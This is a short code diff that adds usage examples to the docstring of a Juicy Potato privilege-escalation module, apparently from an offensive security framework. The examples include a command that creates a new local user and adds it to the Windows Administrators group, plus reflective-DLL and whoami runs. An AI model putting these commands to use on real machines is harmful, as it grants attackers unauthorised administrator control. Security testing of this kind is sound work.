@@ -50,6 +50,10 @@ class Privesc_juicy_potato(Module):
         Examples:
             Add a new local admin:
                 #privesc_juicy_potato 'net user /add admin_test JuicyAdmin_1_2_3! /Y & net localgroup Administrators admin_test /add'
+            Run juicy reflecting a custom COM CLSID:
+                #privesc_juicy_potato 'echo custom_clsid > C:\windows\temp\custom_clsid.txt' 'reflective_dll' '{752073A1-23F2-4396-85F0-8FDB879ED0ED}'
+            Run whoami with the classic Juicy Potato binary:
+                #privesc_juicy_potato 'whoami > C:\windows\temp\whoami_juicy.txt' 'exe'
     """
 
     _runtime_code = ur"""
